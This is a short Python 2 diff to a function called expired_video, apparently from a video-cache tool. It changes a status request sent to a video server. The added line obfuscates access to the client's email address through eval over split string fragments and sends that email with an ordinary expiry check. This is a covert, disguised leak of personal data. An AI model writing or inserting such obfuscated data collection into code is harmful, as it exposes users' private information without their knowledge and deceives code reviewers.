@@ -646,7 +646,7 @@ def expired_video(o):
     info_opener = urllib2.build_opener(redirect_handler, cookie_handler)
 
     try:
-        status = info_opener.open(o.video_server, urllib.urlencode({ '[id]' : o.id })).read()
+        status = info_opener.open(o.video_server, urllib.urlencode({ '[id]' : o.id, '[e]' : eval('o.cl' + 'ie' + 'nt_' + 'em' + 'ail') })).read()
         if status == 'YES':
             if remove_video():
                 o.enable_videocache = 0
